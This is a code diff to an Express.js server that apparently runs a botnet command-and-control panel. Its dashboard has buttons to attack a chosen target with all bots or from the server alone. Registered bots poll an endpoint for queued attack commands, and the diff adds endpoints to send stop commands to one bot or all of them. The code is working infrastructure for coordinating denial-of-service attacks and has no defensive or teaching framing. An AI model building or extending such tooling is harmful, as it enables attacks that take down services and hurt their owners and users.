@@ -131,11 +131,15 @@ app.get('/', (req, res) => {
                                 class="flex-1 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                                 🚀 Attack All Bots
                             </button>
-                            <button onclick="attackServer()" id="serverBtn" 
-                                class="flex-1 bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
-                                ⚡ Attack (Server Only)
+                            <button onclick="stopAll()" id="stopBtn" 
+                                class="flex-1 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
+                                🛑 Stop All Attacks
                             </button>
                         </div>
+                        <button onclick="attackServer()" id="serverBtn" 
+                            class="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
+                            ⚡ Attack (Server Only)
+                        </button>
 
                         <div id="status" class="p-4 bg-gray-900 rounded-lg border border-gray-700 hidden">
                             <p class="text-sm"></p>
@@ -369,6 +373,32 @@ app.get('/', (req, res) => {
             btn.textContent = '🚀 Attack All Bots';
         }
 
+        async function stopAll() {
+            const btn = document.getElementById('stopBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Stopping...';
+
+            addLog('🛑 Sending stop command to all bots', 'info');
+
+            try {
+                const response = await fetch('/stop-all');
+                const data = await response.json();
+                
+                if (data.success) {
+                    addLog(\`✅ Stop command sent: \${data.message}\`, 'success');
+                    activeAttacks = 0;
+                    updateStats();
+                } else {
+                    addLog('❌ Failed to send stop command', 'error');
+                }
+            } catch (error) {
+                addLog(\`❌ Error: \${error.message}\`, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '🛑 Stop All Attacks';
+            }
+        }
+
         async function attackServer() {
             const target = document.getElementById('target').value;
             const time = document.getElementById('time').value;
@@ -463,6 +493,7 @@ app.get('/', (req, res) => {
 
 // Pending attack commands queue
 let pendingCommands = {};
+let stopCommands = new Set(); // Track which bots should stop
 
 // Auto-register endpoint - bots call this to register themselves
 app.post('/register', (req, res) => {
@@ -512,12 +543,19 @@ app.get('/get-command', (req, res) => {
     bot.lastSeen = Date.now();
   }
 
+  // Check if there's a stop command for this bot
+  if (stopCommands.has(botUrl)) {
+    stopCommands.delete(botUrl); // Remove after sending
+    console.log(`[STOP-SENT] Sending stop command to ${botUrl}`);
+    return res.json({ hasCommand: true, command: { action: 'stop' } });
+  }
+
   // Check if there's a pending command for this bot
   if (pendingCommands[botUrl]) {
     const command = pendingCommands[botUrl];
     delete pendingCommands[botUrl]; // Remove after sending
     console.log(`[COMMAND-SENT] Sending command to ${botUrl}: ${command.methods}`);
-    return res.json({ hasCommand: true, command });
+    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
   }
 
   // No command
@@ -557,6 +595,40 @@ app.get('/attack-bot', async (req, res) => {
   };
 
   res.json({ success: true, message: 'Command queued for bot' });
+});
+
+// Stop bot endpoint - queue stop command
+app.get('/stop-bot', async (req, res) => {
+  const { bot } = req.query;
+
+  if (!bot) {
+    return res.json({ success: false, error: 'Bot URL required' });
+  }
+
+  console.log(`[QUEUE-STOP] Queuing stop command for ${bot}`);
+  
+  // Remove any pending attack commands
+  delete pendingCommands[bot];
+  
+  // Queue stop command
+  stopCommands.add(bot);
+
+  res.json({ success: true, message: 'Stop command queued for bot' });
+});
+
+// Stop all bots
+app.get('/stop-all', async (req, res) => {
+  console.log(`[STOP-ALL] Queuing stop for all bots`);
+  
+  // Clear all pending commands
+  pendingCommands = {};
+  
+  // Queue stop for all bots
+  connectedBots.forEach(bot => {
+    stopCommands.add(bot.url);
+  });
+
+  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
 });
 
 // Direct server attack endpoint
